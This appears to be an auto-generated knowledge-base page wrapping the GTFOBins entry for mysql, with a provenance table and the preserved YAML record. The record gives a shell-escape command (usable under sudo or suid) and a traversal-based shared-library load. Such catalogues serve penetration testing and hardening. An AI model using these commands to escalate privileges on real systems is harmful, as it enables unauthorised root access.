---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# mysql

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `mysql` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/mysql` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [mysql](../../tools/linux/mysql.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | mysql |
| name | mysql |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/mysql/ |

## Preserved Source Material

```yaml
_body: ''
_name: mysql
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/mysql
comment: A valid MySQL server must be available to connect to.
functions:
  library-load:
  - code: mysql --default-auth ../../../../../path/to/lib
    comment: The following loads the `/path/to/lib.so` shared object.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: '5.5'
  shell:
  - code: mysql -e '\! /bin/sh'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
